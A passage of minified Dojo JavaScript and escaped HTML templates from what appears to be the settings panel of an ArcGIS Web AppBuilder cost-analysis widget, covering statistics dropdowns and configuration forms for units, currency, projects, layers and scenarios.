d.id);this.own(p(b.layerNameDropDown,"click",m.hitch(this,function(){this._resetLayerNameWidth(b)})));this.own(p(b.layerNameDropDown,"change",m.hitch(this,function(a){this._resetLayerNameWidth(b);this._onLayerNameChange(a,b,d)})));b.layerNameDropDown.startup()},_createLayerNameStore:function(){var a,b,d=[];a=[];d=[this.config.projectSettings.costingGeometryLayer||"",this.config.projectSettings.projectLayer||""];this.config.layerSettings.length&&(b=this.config.layerSettings,g.forEach(b,m.hitch(this,
function(c){var b=this._getFeatureLayerGeometryType(c.id);c.editable&&b&&(d.push(c.id),a.push({name:c.title,value:c.id,geometryType:b}))})));b=this.map.webMapResponse.itemInfo.itemData.operationalLayers;g.forEach(b,m.hitch(this,function(c){"ArcGISFeatureLayer"===c.layerType&&this._checkEditCapabilities(c.layerObject)&&-1===d.indexOf(c.id)&&a.push({name:c.title,value:c.id,geometryType:c.resourceInfo.geometryType})}));this._layerNameStore=new f({idProperty:"value",data:a});this._updateLayerNameOptions()},
_updateLayerNameOptions:function(){var a,b;a=l(".esriCTLayerNameDropdown",this.domNode);g.forEach(a,m.hitch(this,function(a){b=v.byNode(a).get("value");v.byNode(a).set("store",this._layerNameStore);v.byNode(a).set("value",b)}));0===this._layerNameStore.data.length?(n.remove(this.noEditableLayersAvailable,"esriCTHidden"),n.add(this.btnAddStatisticsNodeWrapper,"esriCTHidden"),n.add(this.statisticsLayerTableNode,"esriCTHidden")):(n.add(this.noEditableLayersAvailable,"esriCTHidden"),n.remove(this.btnAddStatisticsNodeWrapper,
"esriCTHidden"),n.remove(this.statisticsLayerTableNode,"esriCTHidden"))},_getFeatureLayerGeometryType:function(a){var c=g.filter(this.map.webMapResponse.itemInfo.itemData.operationalLayers,m.hitch(this,function(c){return a===c.id}));return c.length?c[0].layerObject.geometryType:null},_createStatisticsTypeStore:function(){this._pointLayerStatisticsStore||this._polygonLayerStatisticsStore||this._polylineLayerStatisticsStore||(this._createPointGeometryStatisticsStore(),this._createPolygonGeometryStatisticsStore(),
this._createPolylineGeometryStatisticsStore())},_getStatisticsTypeStore:function(a){switch(a){case "esriGeometryPolygon":return this._polygonLayerStatisticsStore;case "esriGeometryPolyline":return this._polylineLayerStatisticsStore;case "esriGeometryPoint":return this._pointLayerStatisticsStore}},_addStatisticsDropdown:function(c,b,d){var e;c=k.create("div",{"class":"esriCTDropDownContainer"},c);this._createStatisticsTypeStore();e=b.layerNameDropDown._getSelectedOptionsAttr().item.geometryType;e=
this._getStatisticsTypeStore(e);b.statisticsTypeDropdown=new a({name:"statisticsTypeSelect",store:e,labelAttr:"name","class":"esriCTStatisticsTypeDropdown"},c);this.own(p(b.statisticsTypeDropdown,"click",m.hitch(this,function(){this._resetStatisticsTypeWidth(b)})));this.own(p(b.statisticsTypeDropdown,"change",m.hitch(this,function(a){this._resetStatisticsTypeWidth(b);this._onStatisticsTypeChange(a,b,d)})));b.statisticsTypeDropdown.startup()},_createPointGeometryStatisticsStore:function(){this._pointLayerStatisticsStore=
new f({idProperty:"value",data:this._commonStatisticsStoreOption})},_createPolygonGeometryStatisticsStore:function(){this._polygonLayerStatisticsStore=new f({idProperty:"value",data:this._commonStatisticsStoreOption.concat(this._polygonStatisticsStoreOption)})},_createPolylineGeometryStatisticsStore:function(){this._polylineLayerStatisticsStore=new f({idProperty:"value",data:this._commonStatisticsStoreOption.concat(this._polylineStatisticsStoreOption)})},_createFieldStore:function(a){var c,b;c=[];
b=["esriFieldTypeDouble","esriFieldTypeInteger","esriFieldTypeSmallInteger","esriFieldTypeSmallFloat"];this._layerFieldStore[a]||(g.forEach(this.map._layers[a].fields,m.hitch(this,function(a){-1<b.indexOf(a.type)&&-1===this._shapeFields.indexOf(a.name.toLowerCase())&&c.push({name:a.alias||a.name,value:a.name})})),0===c.length&&c.push({name:"\x26nbsp",value:null}),this._layerFieldStore[a]=new f({idProperty:"value",data:c}))},_addLayerFieldDropdown:function(c,b){var d;c=k.create("div",{"class":"esriCTDropDownContainer"},
c);d=b.layerNameDropDown._getSelectedOptionsAttr().value;this._createFieldStore(d);b.layerFieldDropdown=new a({name:"layerFieldDropdown",store:this._layerFieldStore[d],labelAttr:"name","class":"esriCTStatisticsFieldDropdown"},c);this.own(p(b.layerFieldDropdown,"click",m.hitch(this,function(){this._resetLayerFieldWidth(b)})));this.own(p(b.layerFieldDropdown,"change",m.hitch(this,function(){this._resetLayerFieldWidth(b)})));b.layerFieldDropdown.startup();c=b.statisticsTypeDropdown.getValue();this._onStatisticsTypeChange(c,
b)},_addStatisticsLabelTextBox:function(a,b,f){a=k.create("div",{"class":"esriCTTextBoxContainer"},a);b.statisticsLabelTextBox=new d({"class":"esriCTLayerLabelTextBox"},a);f&&f.label&&b.statisticsLabelTextBox.set("value",f.label);b.statisticsLabelTextBox.startup()},_updateStatisticsTable:function(a){var b,c;a.layerId?a.editable?b=a.layerId:c=a.layerId:(b=a.lastSelectedId,c=a.currentSelectedLayerId);c&&(a=this._statisticsLayerTable.getRows(),g.forEach(a,m.hitch(this,function(a){a.layerNameDropDown&&
a.layerNameDropDown.get("value")===c&&this._statisticsLayerTable.deleteRow(a)})),this._layerNameStore.remove(c));b&&""!==c&&(a=this.layerInfosObj.getLayerInfoById(b).layerObject,this._layerNameStore.put({name:a.name,value:b,geometryType:a.geometryType}));this._updateLayerNameOptions()},resetAddNewStatisticsDropdown:function(){var a,b,d,f,k;if(a=l(".simple-table-field.field",this._statisticsLayerTable.domNode))a[0]&&(b=h.getComputedStyle(a[0])),a[1]&&(d=h.getComputedStyle(a[1])),a[2]&&(f=h.getComputedStyle(a[2]));
a=l(".esriCTLayerNameDropdown",this._statisticsLayerTable.domNode);g.forEach(a,m.hitch(this,function(a){(a=l(".dijitReset.dijitInline.dijitSelectLabel.dijitValidationTextBoxLabel",a))&&a[0]&&(k=this.showActionButtonsInColumn?59:30,a[0].style.width=parseInt(b.width,10)-k+"px")}));a=l(".esriCTStatisticsTypeDropdown",this._statisticsLayerTable.domNode);g.forEach(a,m.hitch(this,function(a){(a=l(".dijitReset.dijitInline.dijitSelectLabel.dijitValidationTextBoxLabel",a))&&a[0]&&(k=this.showActionButtonsInColumn?
59:30,a[0].style.width=parseInt(d.width,10)-k+"px")}));a=l(".esriCTStatisticsFieldDropdown",this._statisticsLayerTable.domNode);g.forEach(a,m.hitch(this,function(a){(a=l(".dijitReset.dijitInline.dijitSelectLabel.dijitValidationTextBoxLabel",a))&&a[0]&&(k=this.showActionButtonsInColumn?59:30,a[0].style.width=parseInt(f.width,10)-k+"px")}))},_resetLayerNameWidth:function(a){var b,c;(b=l(".simple-table-field.field",this._statisticsLayerTable.domNode))&&b[0]&&(c=h.getComputedStyle(b[0]));a=l(".dijitReset.dijitInline.dijitSelectLabel.dijitValidationTextBoxLabel",
a.layerNameDropDown.domNode);b=this.showActionButtonsInColumn?59:30;a&&a[0]&&(a[0].style.width=parseInt(c.width,10)-b+"px")},_resetStatisticsTypeWidth:function(a){var b,c;(c=l(".simple-table-field.field",this._statisticsLayerTable.domNode))&&c[1]&&(b=h.getComputedStyle(c[1]));a=l(".dijitReset.dijitInline.dijitSelectLabel.dijitValidationTextBoxLabel",a.statisticsTypeDropdown.domNode);c=this.showActionButtonsInColumn?59:30;a&&a[0]&&(a[0].style.width=parseInt(b.width,10)-c+"px")},_resetLayerFieldWidth:function(a){var b,
c;(b=l(".simple-table-field.field",this._statisticsLayerTable.domNode))&&b[2]&&(c=h.getComputedStyle(b[2]));a=l(".dijitReset.dijitInline.dijitSelectLabel.dijitValidationTextBoxLabel",a.layerFieldDropdown.domNode);b=this.showActionButtonsInColumn?59:30;a&&a[0]&&(a[0].style.width=parseInt(c.width,10)-b+"px")}})})},"widgets/CostAnalysis/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/CostAnalysis/setting/GeneralSettings.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n    \x3cdiv class\x3d"esriCTGeneralSettingsLabel esriCTEllipsis esriCTVerticalCenterAlignLabel" title\x3d"${nls.generalSettings.measurementUnitLabel}"\x3e${nls.generalSettings.measurementUnitLabel}:\x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTDropDownContainer"\x3e\r\n      \x3cselect class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"measurementUnitInputNode"\x3e\r\n        \x3coption value\x3d"feet"\x3e${nls.units.feet.label}\x3c/option\x3e\r\n        \x3coption value\x3d"meters"\x3e${nls.units.meters.label}\x3c/option\x3e\r\n        \x3coption value\x3d"miles"\x3e${nls.units.miles.label}\x3c/option\x3e\r\n        \x3coption value\x3d"yards"\x3e${nls.units.yards.label}\x3c/option\x3e\r\n        \x3coption value\x3d"kilometers"\x3e${nls.units.kilometers.label}\x3c/option\x3e\r\n      \x3c/select\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n    \x3cdiv class\x3d"esriCTGeneralSettingsLabel esriCTEllipsis esriCTVerticalCenterAlignLabel" title\x3d"${nls.generalSettings.currencyLabel}"\x3e${nls.generalSettings.currencyLabel}:\x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTDropDownContainer"\x3e\r\n      \x3cdiv class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"maxLength:\'3\'" data-dojo-attach-point\x3d"currencyInputNode" trim\x3d"true"\r\n        required\x3d"true"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n    \x3cdiv class\x3d"esriCTGeneralSettingsLabel esriCTEllipsis esriCTVerticalCenterAlignLabel" title\x3d"${nls.generalSettings.roundCostLabel}"\x3e${nls.generalSettings.roundCostLabel}:\x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTDropDownContainer"\x3e\r\n      \x3cselect class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"roundCostInputNode"\x3e\r\n        \x3coption value\x3d"twoDecimalPoint"\x3e${nls.generalSettings.roundCostValues.twoDecimalPoint}\x3c/option\x3e\r\n        \x3coption value\x3d"nearestWholeNumber"\x3e${nls.generalSettings.roundCostValues.nearestWholeNumber}\x3c/option\x3e\r\n        \x3coption value\x3d"nearestTen"\x3e${nls.generalSettings.roundCostValues.nearestTen}\x3c/option\x3e\r\n        \x3coption value\x3d"nearestHundred"\x3e${nls.generalSettings.roundCostValues.nearestHundred}\x3c/option\x3e\r\n        \x3coption value\x3d"nearestThousand"\x3e${nls.generalSettings.roundCostValues.nearestThousand}\x3c/option\x3e\r\n        \x3coption value\x3d"nearestTenThousands"\x3e${nls.generalSettings.roundCostValues.nearestTenThousands}\x3c/option\x3e\r\n      \x3c/select\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cfieldset class\x3d"esriCTProjectOutputSettingsFieldset"\x3e\r\n    \x3clegend class\x3d"esriCTProjectOutputSettingsLegend" title\x3d"${nls.generalSettings.projectOutputSettings}"\x3e\r\n      ${nls.generalSettings.projectOutputSettings} \x3c/legend\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTFullHeight esriCTProjectSettingsContainer"\x3e\r\n      \x3cdiv class\x3d"esriCTProjectSettingsOutputLeftContainer"\x3e\r\n        \x3cdiv class\x3d"esriCTProjectAreaTypeContainer esriCTVerticalCenterAlignLabel esriCTEllipsis" title\x3d"${nls.generalSettings.typeOfProjectAreaLabel}"\x3e${nls.generalSettings.typeOfProjectAreaLabel}:\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTProjectAreaTypeInputContainer"\x3e\r\n          \x3cdiv class\x3d""\x3e\r\n            \x3cselect class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"projectAreaTypeInputNode"\x3e\r\n              \x3coption value\x3d"outline"\x3e${nls.generalSettings.projectAreaType.outline}\x3c/option\x3e\r\n              \x3coption value\x3d"buffer"\x3e${nls.generalSettings.projectAreaType.buffer}\x3c/option\x3e\r\n            \x3c/select\x3e\r\n          \x3c/div\x3e\r\n\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTProjectSettingsOutputRightContainer esriCTHidden" data-dojo-attach-point\x3d"projectSettingsOutputRightContainerNode"\x3e\r\n        \x3cdiv class\x3d"esriCTBufferDistanceLabelContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTBufferDistanceLabel esriCTVerticalCenterAlignLabel esriCTEllipsis" title\x3d"${nls.generalSettings.bufferDistanceLabel}"\x3e${nls.generalSettings.bufferDistanceLabel}:\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTBufferDistanceInputContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/NumberTextBox" disabled\x3dtrue data-dojo-attach-point\x3d"bufferDistanceInputNode"\r\n            trim\x3d"true" required\x3d"true" data-dojo-props\x3d""\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTProjectMeasurementUnitContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTVerticalCenterAlignLabel esriCTEllipsis esriCTBufferDistanceUnit" data-dojo-attach-point\x3d"bufferDistanceUnit"\x3e${nls.units.feet.label}\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/fieldset\x3e\r\n\x3c/div\x3e',
"url:widgets/CostAnalysis/setting/ProjectSettings.html":'\x3cdiv\x3e\r\n\t\x3cfieldset class\x3d"esriCTFieldSet"\x3e\r\n\t\t\x3clegend class\x3d"esriCTFieldSetLegend"\x3e\r\n\t\t\t${nls.projectSettings.costingGeometrySectionTitle}\r\n\t\t\x3c/legend\x3e\r\n\t\t\x3cdiv class\x3d"esriCTNote esriCTFullWidth"\x3e${nls.projectSettings.costingGeometrySectionNote}\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Costing Geometry Layer Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.costingGeometryLayerLabel}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.costingGeometryLayerLabel}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Costing Geometry Later Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer" data-dojo-attach-point\x3d"costingGeometryLayerDropDown" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"costingGeometryHelp"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Field to Label Geography Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.fieldLabelGeography}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.fieldLabelGeography}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Field to Label Geography Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer" data-dojo-attach-point\x3d"fieldToLabelGeography" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"fieldToLabelGeographyHelp"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/fieldset\x3e\r\n\t\x3cfieldset class\x3d"esriCTFieldSet"\x3e\r\n\t\t\x3clegend class\x3d"esriCTFieldSetLegend"\x3e\r\n\t\t\t${nls.projectSettings.projectTableSectionTitle}\r\n\t\t\x3c/legend\x3e\r\n\t\t\x3cdiv class\x3d"esriCTNote esriCTFullWidth"\x3e${nls.projectSettings.projectTableSectionNote}\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Project Assets Table Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.projectAssetsTableLabel}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.projectAssetsTableLabel}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Project Assets Table Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer" data-dojo-attach-point\x3d"projectAssetsTable" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"projectAssetsTableHelp"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Project Multiplier Additional Cost Table Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.projectMultiplierTableLabel}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.projectMultiplierTableLabel}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Project Multiplier Additional Cost Table Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer" data-dojo-attach-point\x3d"projectMultiplierTable" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"projectMultiplierTableHelp"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"esriCTRowContainer esriCTFullWidth"\x3e\r\n\t\t\t\x3c!--Project Layer Label--\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.projectSettings.projectLayerLabel}" class\x3d"esriCTLabelContainer esriCTEllipsis"\x3e\r\n\t\t\t\t${nls.projectSettings.projectLayerLabel}:\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c!--Project Layer Dropdown--\x3e\r\n\t\t\t\x3cselect class\x3d"esriCTDropDownContainer esriCTProjectLayerDropdown" data-dojo-attach-point\x3d"projectLayerDropDown" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\x3c/select\x3e\r\n\t\t\t\x3cdiv class\x3d"esriCTHelpIcon" data-dojo-attach-point\x3d"projectLayerHelp"\x3e\x3c/div\x3e\r\n\t\t\t\x3c!--Configure Fields Settings--\x3e\r\n\t\t\t\x3cdiv class\x3d"esriCTConfigureFieldsContainer"\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3c!--Configured Fields Table--\x3e\r\n\t\t\x3cdiv class\x3d"esriCTConfiguredFieldsTable esriCTHidden" data-dojo-attach-point\x3d"configuredFieldsTable"\x3e\x3c/div\x3e\r\n\t\x3c/fieldset\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/CostAnalysis/setting/LayerSettings.html":'\x3cdiv class\x3d"esriCTTabNode"\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"layerSettingsMainContainer"\x3e\r\n    \x3cdiv class\x3d"esriCTLayerSettingsTableNode" data-dojo-attach-point\x3d"layerSettingsTableNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTHidden esriCTNoAssetLayersAvailable" data-dojo-attach-point\x3d"noAssetLayersAvailable"\x3e\r\n      ${nls.layerSettings.noAssetLayersAvailable}\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/CostAnalysis/setting/CostingInfo.html":'\x3cdiv class\x3d"esriCTTabNode"\x3e\r\n    \x3c!--Add Layers section --\x3e\r\n    \x3cdiv class\x3d"esriCTTabContainer row"\x3e\r\n        \x3cdiv class\x3d"esriCTManageScenarioButtonContainer"\x3e\r\n            \x3cdiv class\x3d"esriCTMangeScenarios"\x3e\r\n                \x3cdiv data-dojo-attach-point\x3d"btnManageScenarios" \r\n                class\x3d"esriCTBtnAddSection esriCTEllipsis"\x3e\r\n                    \x3cspan class\x3d"esriCTBtnAddIcon"\x3e\x3c/span\x3e\r\n                    \x3cspan class\x3d"esriCTBtnAddLabel esriCTEllipsis"\x3e${nls.costingInfo.manageScenariosTitle}\x3c/span\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTHidden esriCTNoEditableLayersAvailable" data-dojo-attach-point\x3d"noEditableLayersAvailable"\x3e\r\n                    ${nls.costingInfo.noEditableLayersAvailable}\r\n        \x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"costingTemplateContainer"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/CostAnalysis/setting/ManageScenarios.html":'\x3cdiv class\x3d"esriCTMainConfigurationContainer"\x3e\r\n    \x3cdiv\x3e\r\n        \x3cdiv class\x3d"esriCTPopupFields esriCTEllipsis"\x3e ${nls.costingInfo.scenarioNameLabel}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"scenarioNameNode" required\x3d"true" data-dojo-type\x3d"dijit/form/ValidationTextBox"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-leading-margin1" data-dojo-attach-point\x3d"addBtnNode"\x3e${nls.costingInfo.addBtnLabel}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv\x3e\r\n         \x3cdiv class\x3d"esriCTAddScenarioNameTable" data-dojo-attach-point\x3d"addScenarioNameTableNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n\x3c/div\x3e',
"url:widgets/CostAnalysis/setting/CostingTemplate.html":'\x3cdiv\x3e\r\n    \x3cdiv class\x3d"esriCTLayerNameContainer"\x3e\r\n      \x3cdiv class\x3d"esriCTLayerLabel esriCTEllipsis" data-dojo-attach-point\x3d"layerName"\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"btnCostingTemplateNode" class\x3d"esriCTBtnAddSection esriCTEllipsis"\x3e\r\n        \x3cspan class\x3d"esriCTBtnAddIcon"\x3e\x3c/span\x3e\r\n        \x3cspan class\x3d"esriCTBtnAddLabel esriCTEllipsis"\x3e ${nls.costingInfo.addCostingTemplateLabel}\x3c/span\x3e\r\n      \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTAddLayerTableNode" data-dojo-attach-point\x3d"addLayerTableNode"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/CostAnalysis/setting/EditCostEquation.html":'\x3cdiv class\x3d"esriCTMainConfigurationContainer"\x3e\r\n  \x3cdiv\x3e\r\n    \x3cdiv class\x3d"esriCTPopupFields esriCTEllipsis"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv\x3e\r\n    \x3cdiv\x3e\r\n      \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n        \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTEllipsis esriCTVerticalCenterAlignLabel"\x3e\r\n          ${nls.costingInfo.geographyTitle}\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTCostEquationFieldContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/TextBox" disabled\x3dtrue data-dojo-attach-point\x3d"geographyValue"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n        \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTEllipsis esriCTVerticalCenterAlignLabel"\x3e\r\n          ${nls.costingInfo.scenarioTitle}\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTCostEquationFieldContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/TextBox" disabled\x3dtrue data-dojo-attach-point\x3d"scenarioValue"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTFieldContainer esriCTFullWidth"\x3e\r\n        \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTEllipsis esriCTVerticalCenterAlignLabel "\x3e\r\n          ${nls.costingInfo.costEquationTitle}\x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTFullWidth esriCTCostEquationInput" spellcheck\x3d"false" data-dojo-type\x3d"dijit/form/Textarea" data-dojo-attach-point\x3d"costEquationValue"\r\n            required\x3d"true"\x3e\r\n          \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth"\x3e\r\n      \x3cdiv class\x3d"esriCTHint" data-dojo-attach-point\x3d"costEquationHint"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/CostAnalysis/setting/StatisticsSettings.html":'\x3cdiv class\x3d"esriCTTabNode"\x3e\r\n    \x3cdiv class\x3d"esriCTTabContainer row"\x3e\r\n        \x3cdiv\x3e\r\n            \x3c!--Add New Statistics button--\x3e\r\n            \x3cdiv class\x3d"esriCTStatisticsContainer" data-dojo-attach-point\x3d"btnAddStatisticsNodeWrapper"\x3e\r\n                \x3cdiv data-dojo-attach-point\x3d"btnAddStatisticsNode" class\x3d"esriCTBtnStatisticsAddSection"\x3e\r\n                    \x3cspan class\x3d"esriCTBtnAddStatisticsIcon"\x3e\x3c/span\x3e\r\n                    \x3cspan class\x3d"esriCTBtnStatisticsAddLabel"\x3e ${nls.statisticsSettings.addStatisticsLabel}\x3c/span\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTAddLayerTableNode" data-dojo-attach-point\x3d"statisticsLayerTableNode"\x3e\x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTHidden esriCTNoEditableLayersAvailable" data-dojo-attach-point\x3d"noEditableLayersAvailable"\x3e\r\n                ${nls.costingInfo.noEditableLayersAvailable}\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Add/delete/reorder buttons--\x3e\r\n    \x3cdiv class\x3d"esriCTStatisticsButtonParentDiv"\x3e\r\n        \x3cdiv class\x3d"esriCTAddStatisticsIcon esriCTStatisticsButtons" data-dojo-attach-point\x3d"btnAddNode" title\x3d"${nls.statisticsSettings.addNewStatisticsText}"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTDeleteStatisticsIcon esriCTStatisticsButtons" data-dojo-attach-point\x3d"btnCrossNode"\r\n            title\x3d"${nls.statisticsSettings.deleteStatisticsText}"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTStatisticsUpIcon esriCTStatisticsButtons" data-dojo-attach-point\x3d"btnUpNode" title\x3d"${nls.statisticsSettings.moveStatisticsUpText}"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTStatisticsDownIcon esriCTStatisticsButtons" data-dojo-attach-point\x3d"btnDownNode" title\x3d"${nls.statisticsSettings.moveStatisticsDownText}"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/CostAnalysis/setting/Setting.html":'\x3cdiv style\x3d"width: 100%;height: 100%;"\x3e\r\n\t\x3cdiv class\x3d"esriCTMainConfigurationContainer"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"configurationTabParentContainer"\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"generalSettingsNode" class\x3d"esriCTTabNode"\x3e\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"projectSettingsNode" class\x3d"esriCTTabNode"\x3e\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"layerSettingsNode" class\x3d"esriCTTabNode"\x3e\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"costingInfoNode" class\x3d"esriCTTabNode"\x3e\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"statisticsSettingsNode" class\x3d"esriCTTabNode"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e',
